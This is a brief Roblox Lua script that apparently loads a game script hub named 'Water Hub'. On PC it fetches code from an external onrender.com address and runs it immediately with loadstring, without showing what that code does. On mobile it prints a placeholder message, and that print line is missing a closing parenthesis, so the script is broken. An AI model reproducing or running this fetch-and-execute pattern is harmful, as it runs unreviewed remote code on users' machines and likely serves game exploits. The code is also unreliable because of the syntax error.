local UIS=game:GetService("UserInputService")
local isMobile=UIS.TouchEnabled and not UIS.KeyboardEnabled
local isPC=UIS.KeyboardEnabled and not UIS.TouchEnabled
local isConsole=UIS.GamepadEnabled and not UIS.KeyboardEnabled and not UIS.TouchEnabled

local device="Unknown"
if isPC then
    device="PC"
elseif isMobile then
    device="Mobile"
end

if device=="PC" then
    loadstring(game:HttpGet("https://nexxaop.onrender.com/bd4ba5/raw"))()
elseif device=="Mobile" then
    print("PROXIMAMENTE"
end

print("Water Hub: Detected Device: "..device)
